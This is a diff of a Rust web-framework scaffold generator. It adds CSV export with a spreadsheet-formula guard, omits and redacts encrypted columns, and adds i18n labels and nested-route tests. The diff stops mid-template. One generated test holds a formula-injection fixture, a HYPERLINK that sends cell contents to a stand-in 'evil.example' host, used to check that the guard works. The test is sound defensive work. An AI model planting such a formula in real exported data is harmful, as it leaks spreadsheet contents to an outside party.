+fn render_csv_schema_impl(pascal_name: &str, fields: &[Field]) -> String {
+    use std::fmt::Write as _;
+    // Issue #1340: an at-rest encrypted column is excluded from the export. The
+    // model holds PLAINTEXT in memory, so including it would stream the
+    // decrypted secret of every listed row into a file that then lives outside
+    // the app entirely — a downloaded `.csv` in a Downloads folder, an email
+    // attachment, a shared drive. That is the one place the "plaintext in Rust,
+    // ciphertext at rest" bargain stops holding, and it is exactly why
+    // `autumn-admin-plugin`'s own `AdminModel::csv_export_columns` already
+    // filters `!f.encrypted`. The scaffolded export matches that posture rather
+    // than contradicting the admin for the same column. Re-add the column here
+    // (plus a matching `to_csv_record` entry) if the export genuinely needs it.
+    let exported: Vec<&Field> = fields.iter().filter(|f| !f.is_encrypted()).collect();
+    let mut headers = String::from("\"id\"");
+    let mut record = String::from("            self.id.to_string(),\n");
+    for f in &exported {
+        let _ = write!(headers, ", \"{}\"", f.name);
+        let _ = writeln!(record, "            {},", csv_value_expr(f));
+    }
+    headers.push_str(", \"created_at\"");
+    record.push_str("            self.created_at.to_string(),\n");
+    // The formula guard is emitted only when some column actually routes through
+    // it — an unused `fn` in the generated app is a `dead_code` warning, and the
+    // scaffold's contract is that generated code compiles warning-free.
+    let text_cell_helper = if exported.iter().any(|f| csv_kind_is_text(f.kind)) {
+        CSV_TEXT_CELL_HELPER
+    } else {
+        ""
+    };
+    format!(
+        "{text_cell_helper}\n\n/// CSV column schema for the `GET /…/export.csv` download (issue #1315).\n\
+         ///\n\
+         /// `csv_columns` is the header row and `to_csv_record` the value row: the\n\
+         /// two MUST stay the same length and in the same order, which is the\n\
+         /// contract `export_csv` writes against. Edit them freely — dropping a\n\
+         /// sensitive column from the export is deleting one entry from each.\n\
+         ///\n\
+         /// A NULL column serializes to an EMPTY cell rather than the string\n\
+         /// `\"None\"`, because a blank spreadsheet cell is what \"no value\" means.\n\
+         /// Values are NOT quoted here: `export_csv` writes RFC 4180, so a value\n\
+         /// containing a comma, a double quote or a newline is quoted and escaped\n\
+         /// by the writer — pre-quoting would double-escape it.\n\
+         ///\n\
+         /// Text-backed columns go through `csv_text_cell`, which neutralizes a\n\
+         /// leading `=`/`+`/`-`/`@` so a spreadsheet cannot execute a value someone\n\
+         /// typed into this app as a formula. See that helper for the rationale and\n\
+         /// how to opt out.\n\
+         ///\n\
+         /// An `Attachment` column exports the blob's STORAGE KEY, not the signed,\n\
+         /// time-bounded URL the `show` view renders — a spreadsheet cell has no\n\
+         /// use for a URL that expires. Drop the column here if those keys should\n\
+         /// not leave the app.\n\
+         ///\n\
+         /// An at-rest `#[encrypted]` column is OMITTED entirely (issue #1340):\n\
+         /// the model holds plaintext in memory, so exporting it would write the\n\
+         /// decrypted secret of every listed row into a file that leaves the app.\n\
+         /// The admin panel's own CSV export omits encrypted columns for the same\n\
+         /// reason. Add the column to BOTH lists below if you really need it.\n\
+         impl autumn_web::data::csv::CsvSchema for {pascal_name} {{\n    \
+         fn csv_columns() -> &'static [&'static str] {{\n        \
+         &[{headers}]\n    \
+         }}\n\n    \
+         fn to_csv_record(&self) -> Vec<String> {{\n        \
+         vec![\n{record}        ]\n    \
+         }}\n\
+         }}\n"
+    )
+}
+
 /// Whether a column of this kind is server-sortable via the generated
 /// `list()` method (#1126).
 ///
 /// Mirrors the orderable-type allowlist in the `#[model]` macro: every scalar
-/// column is sortable EXCEPT binary blobs (`Bytea`/`Attachment`) and closed-set
+/// column is sortable EXCEPT binary blobs (`Bytea`/`Attachment`), closed-set
 /// `Enum` columns (whose Rust type is a generated enum the macro doesn't emit a
-/// sort arm for). Emitting `.sortable(..)` only for these keeps the rendered
-/// header links symmetric with what the server actually applies — a link that
-/// resolves to the default order would be a dead affordance.
+/// sort arm for), and `Json` columns (`serde_json::Value` isn't in the macro's
+/// orderable allowlist either — issue #1341). Emitting `.sortable(..)` only for
+/// these keeps the rendered header links symmetric with what the server
+/// actually applies — a link that resolves to the default order would be a
+/// dead affordance.
 const fn kind_is_sortable(kind: FieldKind) -> bool {
     !matches!(
         kind,
-        FieldKind::Bytea | FieldKind::Attachment | FieldKind::Enum
+        FieldKind::Bytea | FieldKind::Attachment | FieldKind::Enum | FieldKind::Json
     )
+}
+
+/// Whether this *field* should render a sortable index header.
+///
+/// [`kind_is_sortable`] answers the question for the column's storage type; an
+/// at-rest encrypted column (issue #1340) fails it for a second reason the kind
+/// cannot see. `#[encrypted]` columns are `String`, so the `#[model]` macro
+/// happily puts them in its `ORDER BY` allowlist — but the database only holds
+/// base64 ciphertext, so the server would order by envelope bytes. For a
+/// randomized column that order is arbitrary and reshuffles on every write; for
+/// a deterministic one it is stable but still unrelated to the plaintext order
+/// the header link promises. Either way the control lies about what it does, so
+/// don't render it (same posture as the nested child list, which withholds
+/// `.sortable(..)` rather than stamp an `aria-sort` that never changes).
+const fn field_is_sortable(field: &Field) -> bool {
+    kind_is_sortable(field.kind) && !field.is_encrypted()
 }
 
 /// Emit the `let columns: Vec<Column<Pascal>> = vec![…];` block for the index handler.
@@ -4982,27 +10061,74 @@ const fn kind_is_sortable(kind: FieldKind) -> bool {
 /// (the sort key is the column's snake name) so the `data_table` renders header
 /// links that the generated `list()` method applies against the model's column
 /// allowlist (#1126). The trailing "Show" action column is never sortable.
+#[allow(
+    clippy::too_many_arguments,
+    reason = "one column-vec renderer serving the index, the search fragment, the \
+              trash table, and the nested child list — splitting it would fork the \
+              header/cell emission the four surfaces must agree on"
+)]
 fn render_columns_vec(
     pascal_name: &str,
+    snake_name: &str,
     fields: &[Field],
     reference_displays: &BTreeMap<String, ReferenceDisplay>,
     use_label_maps: bool,
+    route_key_field: Option<&str>,
+    // Whether the emitted columns advertise themselves as sortable. `true` for
+    // the flat index, whose handler extracts a `ListQuery` and actually honours
+    // `?sort=&dir=`. `false` for the nested child list (issue #1323), which runs
+    // a fixed `ORDER BY id DESC`: a sortable header there renders a link that
+    // reloads the identical list and stamps an `aria-sort` that never changes —
+    // an accessibility lie, not just a dead control.
+    sortable: bool,
+    // Issue #1349: with `--i18n`, each header becomes a `let`-bound `t!` lookup
+    // rather than an inline literal — `Column::new` borrows its header for the
+    // column's lifetime, so a `&t!(…)` temporary inside the `vec![…]` would be
+    // dropped before the table renders.
+    labels: &scaffold_i18n::ViewLabels,
 ) -> String {
     use std::fmt::Write as _;
     let mut out = String::with_capacity(fields.len() * 150 + 300);
+    // Header bindings first: `Column::new` takes `&'a str`, so a translated
+    // header has to outlive the `vec![…]` it is built into.
+    if labels.enabled() {
+        let _ = writeln!(
+            out,
+            "    let l_col_id = {};",
+            labels.lit("common.field.id", "Id")
+        );
+        for f in fields {
+            let name = &f.name;
+            let _ = writeln!(
+                out,
+                "    let l_col_{name} = {};",
+                labels.lit(&format!("{snake_name}.field.{name}"), &title_case(name))
+            );
+        }
+    }
     let _ = writeln!(
         out,
         "    let columns: Vec<autumn_web::widgets::Column<{pascal_name}>> = vec!["
     );
     // ID column — always sortable (the default order is `id DESC`).
+    let id_sortable = if sortable { ".sortable(\"id\")" } else { "" };
+    let id_header = if labels.enabled() {
+        "&l_col_id".to_owned()
+    } else {
+        format!("\"{}\"", title_case("id"))
+    };
     let _ = writeln!(
         out,
-        "        autumn_web::widgets::Column::new(\"Id\", |row: &{pascal_name}| maud::html! {{ (row.id) }}).sortable(\"id\"),"
+        "        autumn_web::widgets::Column::new({id_header}, |row: &{pascal_name}| maud::html! {{ (row.id) }}){id_sortable},"
     );
     // One column per field
     for f in fields {
-        let header = title_case(&f.name);
-        let sortable_suffix = if kind_is_sortable(f.kind) {
+        let header = if labels.enabled() {
+            format!("&l_col_{}", f.name)
+        } else {
+            format!("\"{}\"", title_case(&f.name))
+        };
+        let sortable_suffix = if sortable && field_is_sortable(f) {
             format!(".sortable(\"{}\")", f.name)
         } else {
             String::new()
@@ -5028,15 +10154,35 @@ fn render_columns_vec(
         } else {
             cell_value_expr(f)
         };
+        // Issue #1340: an at-rest encrypted column renders a redaction marker in
+        // a LIST cell, never the decrypted value. A list is a bulk-disclosure
+        // surface — one page shows every row's secret at once, to everyone the
+        // index is authorized for, and ends up in screenshots, printouts, and
+        // page caches. The single-record `show` view and the `edit` form still
+        // render the real value: the reader routed there deliberately, for one
+        // record, and a form has to show what it is editing. That split mirrors
+        // the admin panel's own `.encrypted()` / `.encrypted_visible()`. The
+        // closure binds `_row` because the cell ignores it, keeping the
+        // generated app warning-free.
+        let (binding, cell_expr) = if f.is_encrypted() {
+            ("_row", "\"••••••••\"".to_owned())
+        } else {
+            ("row", cell_expr)
+        };
         let _ = writeln!(
             out,
-            "        autumn_web::widgets::Column::new(\"{header}\", |row: &{pascal_name}| maud::html! {{ ({cell_expr}) }}){sortable_suffix},"
+            "        autumn_web::widgets::Column::new({header}, |{binding}: &{pascal_name}| maud::html! {{ ({cell_expr}) }}){sortable_suffix},"
         );
     }
-    // Show link column
+    // Show link column. Keyed off the slug (issue #1260) when the model has
+    // one, matching `paths::show`'s rekeyed `Path<String>` route; a non-slug
+    // model keeps the pre-#1260 `row.id` byte-for-byte.
+    let show_link_arg =
+        route_key_field.map_or_else(|| "row.id".to_owned(), |field| format!("&row.{field}"));
     let _ = writeln!(
         out,
-        "        autumn_web::widgets::Column::new(\"\", |row: &{pascal_name}| maud::html! {{ (autumn_web::a11y::Link::new(paths::show(row.id), \"Show\")) }}),"
+        "        autumn_web::widgets::Column::new(\"\", |row: &{pascal_name}| maud::html! {{ (autumn_web::a11y::Link::new(paths::show({show_link_arg}), {})) }}),",
+        labels.lit("common.show", "Show")
     );
     let _ = writeln!(out, "    ];");
     out
@@ -5052,23 +10198,115 @@ fn render_columns_vec(
 fn render_show_property_rows(
     fields: &[Field],
     reference_displays: &BTreeMap<String, ReferenceDisplay>,
+    // Issue #1349: `property_list` takes `&[(&str, Markup)]`, so a translated
+    // label is a `let` binding (see [`render_show_property_label_binds`]) rather
+    // than an inline `t!` call whose `String` would be dropped with the `vec![…]`
+    // temporary.
+    labels: &scaffold_i18n::ViewLabels,
 ) -> String {
+    use std::fmt::Write as _;
     let mut out = String::with_capacity(fields.len() * 100 + 150);
-    out.push_str("        (\"Id\", maud::html! { (row.id) }),\n");
+    let id_label = if labels.enabled() {
+        "&l_prop_id".to_owned()
+    } else {
+        "\"Id\"".to_owned()
+    };
+    let _ = writeln!(out, "        ({id_label}, maud::html! {{ (row.id) }}),");
     for f in fields {
-        let label = humanize(&f.name);
+        // One key per field, shared with the index header and the form control.
+        // The English is the derive's Title Case rather than this view's older
+        // sentence case, so all three surfaces read alike once translated.
+        let label = if labels.enabled() {
+            format!("&l_prop_{}", f.name)
+        } else {
+            format!("\"{}\"", humanize(&f.name))
+        };
         let cell_expr = if f.kind.is_reference() && reference_displays.contains_key(&f.name) {
             format!("{}_label", f.name)
+        } else if f.kind.is_attachment() {
+            // Issue #1236: the detail page renders the file the record actually
+            // references — a download link through the signed URL the handler
+            // resolved into `{name}_url` — instead of the index's cheap
+            // presence marker. See `attachment_link` in the generated routes.
+            let name = &f.name;
+            // The locale argument matches `attachment_link`'s `--i18n` signature
+            // (see `render_routes_file`): the meta span it renders is bundle
+            // text, and this handler holds the extractor.
+            let locale_arg = if labels.enabled() { "&locale, " } else { "" };
+            format!(
+                "attachment_link({locale_arg}row.{name}.as_ref(), {name}_url.as_deref(), \"{name}\")"
+            )
+        } else if f.kind.is_rich_text() {
+            // Issue #1255: the column stores user-submitted Markdown SOURCE, so
+            // the show page renders it through `render_user_content` — raw-HTML
+            // passthrough disabled, output run through an allowlist sanitizer.
+            // This is the one place the scaffold emits pre-escaped markup from a
+            // user-controlled column, and it is exactly why that helper exists.
+            let name = &f.name;
+            if f.nullable {
+                format!(
+                    "autumn_web::markdown::render_user_content(row.{name}.as_deref().unwrap_or_default())"
+                )
+            } else {
+                format!("autumn_web::markdown::render_user_content(&row.{name})")
+            }
         } else {
             cell_value_expr(f)
         };
-        out.push_str("        (\"");
+        out.push_str("        (");
         out.push_str(&label);
-        out.push_str("\", maud::html! { (");
+        out.push_str(", maud::html! { (");
         out.push_str(&cell_expr);
         out.push_str(") }),\n");
     }
-    out.push_str("        (\"Created at\", maud::html! { (row.created_at.to_string()) }),\n");
+    let created_label = if labels.enabled() {
+        "&l_prop_created_at".to_owned()
+    } else {
+        "\"Created at\"".to_owned()
+    };
+    let _ = writeln!(
+        out,
+        "        ({created_label}, maud::html! {{ (row.created_at.to_string()) }}),"
+    );
+    out
+}
+
+/// The `let l_prop_* = t!(…);` bindings the `show` view evaluates before
+/// building its `props` vec (issue #1349).
+///
+/// Separate from [`render_show_property_rows`] because `property_list` borrows
+/// each label for the life of the slice: a `t!` call spliced straight into the
+/// `vec![…]` would produce a `String` temporary dropped at the end of that
+/// statement. Empty without `--i18n`, where the labels are `&'static str`
+/// literals with nothing to bind.
+fn render_show_property_label_binds(
+    fields: &[Field],
+    snake_name: &str,
+    labels: &scaffold_i18n::ViewLabels,
+) -> String {
+    use std::fmt::Write as _;
+    if !labels.enabled() {
+        return String::new();
+    }
+    let mut out = String::with_capacity(fields.len() * 60 + 120);
+    let _ = writeln!(
+        out,
+        "    let l_prop_id = {};",
+        labels.lit("common.field.id", "Id")
+    );
+    for f in fields {
+        let name = &f.name;
+        let _ = writeln!(
+            out,
+            "    let l_prop_{name} = {};",
+            labels.lit(&format!("{snake_name}.field.{name}"), &title_case(name))
+        );
+    }
+    let _ = writeln!(
+        out,
+        "    let l_prop_created_at = {};",
+        labels.lit("common.field.created_at", &title_case("created_at"))
+    );
     out
 }
 
@@ -5123,10 +10361,13 @@ fn render_show_reference_label_loads(
 /// Emit the `let {name}_labels: HashMap<String, String> = …;` bindings the
 /// plain (non-sharded) `index` handler evaluates before building its data-table
 /// columns, one per `references` field with a resolved display column
-/// (issue #1146). Each reuses the field's `{name}_select_options` loader (a
-/// simple per-view fetch; the batched variant is out of scope, #835) to map
-/// each parent id string to its display label, which the column closures then
-/// look up per row. Empty when the resource has no displayable references.
+/// (issue #1146, batched per #835). Unlike the in-FORM `<select>`, which
+/// needs every possible parent row, the index only ever displays the parent
+/// label for the page's own rows — so this queries just the FK ids present
+/// in `page_data.content` (`WHERE id = ANY(...)`, at most one page's worth of
+/// ids) instead of reusing the form's `{name}_select_options` loader, which
+/// scans the WHOLE referenced table on every index view regardless of page
+/// size. Empty when the resource has no displayable references.
 fn render_index_reference_label_loads(
     reference_fields: &[&Field],
     reference_displays: &BTreeMap<String, ReferenceDisplay>,
@@ -5134,14 +10375,35 @@ fn render_index_reference_label_loads(
     use std::fmt::Write as _;
     let mut out = String::new();
     for f in reference_fields {
-        if !reference_displays.contains_key(&f.name) {
+        let Some(display) = reference_displays.get(&f.name) else {
             continue;
-        }
+        };
+        let Some(table) = f.reference_table() else {
+            continue;
+        };
         let name = &f.name;
+        let column = &display.column;
+        let (load_ty, label_expr) = if display.column_nullable {
+            ("Option<String>", "label.unwrap_or_else(|| id.to_string())")
+        } else {
+            ("String", "label")
+        };
+        let ids_expr = if f.nullable {
+            format!("page_data.content.iter().filter_map(|row| row.{name}).collect()")
+        } else {
+            format!("page_data.content.iter().map(|row| row.{name}).collect()")
+        };
         let _ = writeln!(
             out,
-            "    let {name}_labels: std::collections::HashMap<String, String> =\n        \
-             {name}_select_options(&mut db).await?.into_iter().collect();"
+            "    let {name}_ids: Vec<i64> = {ids_expr};\n    \
+             let {name}_labels: std::collections::HashMap<String, String> = {table}::table\n        \
+             .filter({table}::id.eq_any({name}_ids))\n        \
+             .select(({table}::id, {table}::{column}))\n        \
+             .load::<(i64, {load_ty})>(&mut *db)\n        \
+             .await?\n        \
+             .into_iter()\n        \
+             .map(|(id, label)| (id.to_string(), {label_expr}))\n        \
+             .collect();"
         );
     }
     out
@@ -5238,14 +10500,67 @@ fn render_update_columns(plural: &str, fields: &[Field]) -> String {
         if i > 0 {
             out.push_str(", ");
         }
-        write!(
-            out,
-            "{plural}::{name}.eq(new.{name}.clone())",
-            name = f.name
-        )
+        // Issue #1340: this `.set((…))` tuple is a RAW diesel write — it does
+        // not go through `New{Model}`/`Update{Model}`, so it never sees the
+        // `#[diesel(serialize_as = …)]` wrapper the `#[model]` macro attaches to
+        // an `#[encrypted]` field. Binding the bare `String` here would store
+        // PLAINTEXT in a column the reader then tries to decrypt: a silent leak
+        // of exactly the data the annotation exists to protect, plus a
+        // `MalformedEnvelope` error on the very next read. Bind through the same
+        // wrapper type instead, so the update path encrypts identically to the
+        // insert path.
+        match f.encrypted_mode() {
+            Some(mode) => write!(
+                out,
+                "{plural}::{name}.eq(autumn_web::encryption::{wrapper}::from(new.{name}.clone()))",
+                name = f.name,
+                wrapper = encryption_wrapper_type(mode),
+            ),
+            None => write!(
+                out,
+                "{plural}::{name}.eq(new.{name}.clone())",
+                name = f.name
+            ),
+        }
         .unwrap();
     }
     out
+}
+
+/// How the generated raw-diesel insert passes the `New{Model}` record to
+/// `.values(…)` — `&new` normally, `new` (owned) once any column is
+/// `{encrypted}` (issue #1340).
+///
+/// `#[diesel(serialize_as = …)]`, which the `#[model]` macro attaches to every
+/// `#[encrypted]` field, *consumes* the field on the way to SQL, so diesel
+/// implements `Insertable<table>` for the owned `New{Model}` only — never for
+/// `&New{Model}`. Borrowing would fail to compile the generated app with
+/// "the trait bound `&NewX: Insertable<table>` is not satisfied". The macro's
+/// own factory and bulk-upsert codegen already pass owned records for exactly
+/// this reason.
+///
+/// The borrowed form is kept for every other scaffold so unencrypted output
+/// stays byte-for-byte identical; `new` is not read after the insert on either
+/// path, so the move is always sound.
+fn insert_record_expr(fields: &[Field]) -> &'static str {
+    if fields.iter().any(Field::is_encrypted) {
+        "new"
+    } else {
+        "&new"
+    }
+}
+
+/// The `autumn_web::encryption` diesel wrapper type that encrypts a column in
+/// `mode` on the way to the database (issue #1340).
+///
+/// Mirrors `autumn-macros`' `encrypted_wrapper_path`, which is what the
+/// `#[model]` macro splices into `#[diesel(serialize_as = …)]` — the raw-diesel
+/// update path has to name the same type by hand to encrypt identically.
+const fn encryption_wrapper_type(mode: EncryptedMode) -> &'static str {
+    match mode {
+        EncryptedMode::Randomized => "RandomizedText",
+        EncryptedMode::Deterministic => "DeterministicText",
+    }
 }
 
 /// Render one `db.execute_sql("...").await;` call per statement in `sql`,
@@ -5528,6 +10843,11 @@ fn render_reference_stub_tables_sql(fields: &[Field], own_table: &str) -> String
 /// also gets a stub target table created first — see
 /// [`render_reference_stub_tables_sql`].
 #[allow(clippy::too_many_arguments)]
+// Each bool is one independently-gated generated test section, all of them
+// already computed by the caller — folding them into an options struct would
+// move the same flags one level out without removing a single call-site
+// decision.
+#[allow(clippy::fn_params_excessive_bools)]
 fn render_smoke_test(
     pascal_name: &str,
     plural: &str,
@@ -5538,6 +10858,7 @@ fn render_smoke_test(
     defaults: &BTreeMap<String, String>,
     validations: &BTreeMap<String, Vec<String>>,
     authorize: bool,
+    bulk_delete: bool,
 ) -> String {
     let stub_tables_sql = render_reference_stub_tables_sql(fields, plural);
     let create_table_sql =
@@ -5591,7 +10912,17 @@ fn render_smoke_test(
     let base = if api {
         base
     } else {
-        base + &render_write_path_smoke_test(pascal_name, plural)
+        base + &render_write_path_smoke_test(pascal_name, plural, bulk_delete)
+    };
+
+    // Issue #1318 (AC6): a scaffold that opted into optimistic locking gets a
+    // dedicated stale-write test — the one behavior a reader would otherwise
+    // have to take on trust, and the one a later refactor is most likely to
+    // silently drop.
+    let base = if !api && super::model::lock_version_field(fields).is_some() {
+        base + &render_optimistic_lock_smoke_test(plural)
+    } else {
+        base
     };
 
     // Issue #1236 (AC6): attachment scaffolds additionally get a multipart
@@ -5600,7 +10931,7 @@ fn render_smoke_test(
     // `LocalBlobStore`, persists the returned `Blob` in a real Postgres row, and
     // asserts the persisted attachment column bound a non-empty blob key.
     let base = if !api && has_attachment_fields(fields) {
-        base + &render_attachment_multipart_write_path_smoke_test(plural, fields)
+        base + &render_attachment_multipart_write_path_smoke_test(pascal_name, plural, fields)
     } else {
         base
     };
@@ -5821,6 +11152,335 @@ fn render_validation_rejection_smoke_test(
     )
 }
 
+/// Render the nested parent/child write-path test (issue #1323 AC7), appended to
+/// `tests/<snake>.rs` for a `--belongs-to` scaffold.
+///
+/// Pins the three claims the nesting makes, in one in-process `#[tokio::test]`:
+///
+/// * creating a child under a parent redirects (303 PRG) to that parent's show
+///   route — the same contract the generated `nested_create` handler has;
+/// * the child then appears in **that** parent's list;
+/// * and it does **not** appear under a different parent — the negative half,
+///   which is what makes the parent-scoping assertion have teeth.
+///
+/// Plus the security claim the nested create rests on: a body-supplied foreign
+/// key is ignored, because the handler overwrites it from the path before
+/// validating.
+///
+/// Like every other generated write-path test this drives a stand-in resource
+/// rather than the project's own handlers (a `tests/*.rs` integration binary
+/// cannot import a binary crate's modules) and needs no database, so it is a
+/// visible green rather than an `#[ignore]`d one.
+#[allow(
+    clippy::too_many_lines,
+    reason = "a single verbatim test template plus its placeholder substitutions"
+)]
+fn render_nested_write_path_smoke_test(
+    pascal_name: &str,
+    plural: &str,
+    nesting: &super::nested::Nesting,
+) -> String {
+    const TEMPLATE: &str = r#"
+// ── nested parent/child write path (issue #1323) ──────────────────────────
+//
+// create child under parent -> child appears in THAT parent's list -> child
+// does NOT appear under a different parent. `TestApp::new()` disables CSRF, so
+// these same-origin form POSTs need no `_csrf` token (the real
+// form_for-rendered inline form injects one for the browser).
+#[tokio::test]
+async fn __PLURAL___nested_under_parent() {
+    use autumn_web::test::{TestApp, TestClient};
+
+    // A process-local stand-in for the persistence layer: `(id, parent_id, name)`
+    // rows shared across requests within this test. No database required.
+    static NESTED_STORE: std::sync::Mutex<Vec<(i64, i64, String)>> =
+        std::sync::Mutex::new(Vec::new());
+
+    #[derive(serde::Deserialize, serde::Serialize, Default, validator::Validate, Clone)]
+    struct NestedForm {
+        #[validate(length(min = 1, message = "must not be blank"))]
+        name: String,
+        // Mirrors the generated `__PASCAL__Form`: the parent foreign key carries
+        // `#[serde(default)]` because the nested inline form renders no control
+        // for it, so a nested submission legitimately omits it.
+        #[serde(default)]
+        __FK__: String,
+    }
+
+    #[get("/__PARENT_PLURAL__/{__FK__}/__PLURAL__")]
+    async fn nested_index(__FK__: Path<i64>) -> Markup {
+        let store = NESTED_STORE.lock().unwrap();
+        html! {
+            h1 { "__PLURAL__ for __PARENT_PLURAL__ " (*__FK__) }
+            ul {
+                @for (_, parent, name) in store.iter() {
+                    @if *parent == *__FK__ { li { (name.as_str()) } }
+                }
+            }
+        }
+    }
+
+    #[post("/__PARENT_PLURAL__/{__FK__}/__PLURAL__")]
+    async fn nested_create(__FK__: Path<i64>, form: ChangesetForm<NestedForm>) -> impl IntoResponse {
+        match form.into_valid() {
+            Ok(mut valid) => {
+                // The parent is the ROUTE, never the payload -- exactly what the
+                // generated handler does before it validates and inserts.
+                valid.__FK__ = __FK__.to_string();
+                let parent: i64 = valid.__FK__.parse().unwrap_or_default();
+                let mut store = NESTED_STORE.lock().unwrap();
+                let id = store.iter().map(|(i, _, _)| *i).max().unwrap_or(0) + 1;
+                store.push((id, parent, valid.name));
+                Redirect::to(&format!("/__PARENT_PLURAL__/{}", *__FK__)).into_response()
+            }
+            Err(form) => (
+                StatusCode::UNPROCESSABLE_ENTITY,
+                html! { (autumn_web::form::text_input(&form.changeset, "name", "name")) },
+            )
+                .into_response(),
+        }
+    }
+
+    let client: TestClient = TestApp::new()
+        .routes(routes![nested_index, nested_create])
+        .build();
+
+    // Create a child under parent 1: PRG redirects (303 See Other) to that
+    // parent's show page, not to the child's own index.
+    client
+        .post("/__PARENT_PLURAL__/1/__PLURAL__")
+        .form("name=under-parent-one")
+        .send()
+        .await
+        .assert_status(303)
+        .assert_header("location", "/__PARENT_PLURAL__/1");
+
+    // It shows up in THAT parent's list ...
+    client
+        .get("/__PARENT_PLURAL__/1/__PLURAL__")
+        .send()
+        .await
+        .assert_ok()
+        .assert_body_contains("under-parent-one");
+
+    // ... and NOT under a different parent. This negative is the whole point of
+    // the nested read route: a list scoped to one parent must never leak
+    // another's rows.
+    let other_parent = client.get("/__PARENT_PLURAL__/2/__PLURAL__").send().await;
+    other_parent.assert_ok();
+    assert!(
+        !other_parent.text().contains("under-parent-one"),
+        "a child must not appear under a different parent:\n{}",
+        other_parent.text()
+    );
+
+    // A hand-crafted body carrying its own foreign key cannot re-parent the
+    // child: the path wins, because the handler overwrites the field before it
+    // validates.
+    client
+        .post("/__PARENT_PLURAL__/2/__PLURAL__")
+        .form("name=path-wins&__FK__=1")
+        .send()
+        .await
+        .assert_status(303);
+    let parent_one = client.get("/__PARENT_PLURAL__/1/__PLURAL__").send().await;
+    assert!(
+        !parent_one.text().contains("path-wins"),
+        "a submitted __FK__ must not override the parent in the URL:\n{}",
+        parent_one.text()
+    );
+    client
+        .get("/__PARENT_PLURAL__/2/__PLURAL__")
+        .send()
+        .await
+        .assert_body_contains("path-wins");
+
+    // An invalid submission re-renders at 422 with an inline error and persists
+    // nothing -- the parent's list is unchanged.
+    client
+        .post("/__PARENT_PLURAL__/1/__PLURAL__")
+        .form("name=")
+        .send()
+        .await
+        .assert_status(422)
+        .assert_body_contains("role=\"alert\"");
+    let after = client.get("/__PARENT_PLURAL__/1/__PLURAL__").send().await;
+    assert!(
+        after.text().matches("<li>").count() == 1,
+        "a rejected create must not persist a row:\n{}",
+        after.text()
+    );
+}
+"#;
+    TEMPLATE
+        .replace("__PARENT_PLURAL__", &nesting.parent_plural)
+        .replace("__PASCAL__", pascal_name)
+        .replace("__FK__", &nesting.fk)
+        .replace("__PLURAL__", plural)
+}
+
+/// Render the generated `tests/<snake>.rs` CSV-download test (issue #1315, AC6).
+///
+/// Like [`render_write_path_smoke_test`] this drives a stand-in resource rather
+/// than the real `routes::{plural}::export_csv` — a `tests/` binary cannot
+/// import a project's own code when the project has no `src/lib.rs`, so the
+/// stand-in restates the model's column list and the two cell expressions the
+/// generated impl uses (`unwrap_or_default()` for a NULL, `csv_text_cell` for
+/// text).
+///
+/// What it proves is the DOWNLOAD CONTRACT end to end on the real shipped
+/// primitives: `export_csv` writing RFC 4180, `Download` deriving
+/// `Content-Type`/`Content-Disposition`/`Content-Length` from the `.csv`
+/// filename, the formula guard surviving into the body, and the whole
+/// in-process request pipeline. It does NOT pin `src/routes/{plural}.rs`'s
+/// `csv_columns` — nothing in a `tests/` binary can see that impl; the
+/// generator-side tests (`csv_columns_cover_every_scaffolded_column_in_
+/// declaration_order`, `csv_value_expr_never_stringifies_an_option_as_none`)
+/// own that.
+///
+/// Needs no database, so it is NOT `#[ignore]`d — it runs on a bare `cargo test`.
+#[allow(clippy::too_many_lines)] // the emitted test body is one raw-string template
+fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
+    use std::fmt::Write as _;
+    // The header row `export_csv` writes: `id` plus the model's own columns, in
+    // the same order the generated `CsvSchema::csv_columns` lists them.
+    let mut columns = String::from("\"id\"");
+    let mut header_row = String::from("id");
+    // `created_at` closes the list, matching `render_csv_schema_impl`.
+    let names: Vec<&str> = fields
+        .iter()
+        .map(|f| f.name.as_str())
+        .chain(std::iter::once("created_at"))
+        .collect();
+    for name in &names {
+        let _ = write!(columns, ", \"{name}\"");
+        let _ = write!(header_row, ",{name}");
+    }
+    // Three rows, each isolating one rule. Every cell is an `Option<String>` so
+    // `None` genuinely models a NULL column: if the emitted expression were a
+    // debug format instead of `unwrap_or_default()`, the `None` assertion below
+    // would fire. Rows 2 and 3 put the interesting value in the FIRST cell and
+    // leave the rest NULL.
+    let cells = |first: &str| -> String {
+        let mut out = String::new();
+        for (i, _) in names.iter().enumerate() {
+            if i > 0 {
+                out.push_str(", ");
+            }
+            if i == 0 {
+                out.push_str(first);
+            } else {
+                out.push_str("None");
+            }
+        }
+        out
+    };
+    let filled_cells = names
+        .iter()
+        .map(|name| format!("Some(\"{name}-value\".to_owned())"))
+        .collect::<Vec<_>>()
+        .join(", ");
+    // `a,b "q"` + a newline: every character RFC 4180 has a rule for.
+    let quoting_cells = cells("Some(\"a,b \\\"q\\\"\\nz\".to_owned())");
+    // The classic exfiltration payload a colleague's spreadsheet would execute.
+    let formula_cells = cells(
+        "Some(\"=HYPERLINK(\\\"https://evil.example/?d=\\\"&A2,\\\"quarterly report\\\")\".to_owned())",
+    );
+    format!(
+        "\n\
+         // ── CSV export download (issue #1315) ─────────────────────────────────────\n\
+         //\n\
+         // Drives the same `export_csv` + `Download` pair the generated\n\
+         // `GET /{plural}/export.csv` handler uses. Proves the download contract\n\
+         // (200, `text/csv`, an `attachment` disposition, the header row) and the\n\
+         // three cell rules the export depends on: a NULL column is an EMPTY cell,\n\
+         // a value containing a comma/quote/newline is RFC 4180 quoted, and a value\n\
+         // that looks like a spreadsheet formula is neutralized.\n\
+         //\n\
+         // The row type is a stand-in -- a `tests/` binary cannot import this\n\
+         // project's own modules (see `docs/guide/tutorial/11-testing.md`) -- so it\n\
+         // restates the column list and the two cell expressions from\n\
+         // `src/routes/{plural}.rs`. Keep them in step if you edit that impl.\n\
+         //\n\
+         // No database required, so this runs on a plain `cargo test`.\n\
+         #[tokio::test]\n\
+         async fn {plural}_export_csv_downloads_a_spreadsheet() {{\n    \
+         use autumn_web::test::{{TestApp, TestClient}};\n\n    \
+         /// Mirror of `src/routes/{plural}.rs`'s `csv_text_cell`.\n    \
+         fn csv_text_cell(value: String) -> String {{\n        \
+         if value.starts_with(['=', '+', '-', '@', '\\t', '\\r']) {{\n            \
+         let mut guarded = String::with_capacity(value.len() + 1);\n            \
+         guarded.push('\\'');\n            \
+         guarded.push_str(&value);\n            \
+         guarded\n        \
+         }} else {{\n            \
+         value\n        \
+         }}\n    \
+         }}\n\n    \
+         /// Stand-in for the scaffolded model: `id` plus one cell per column, in\n    \
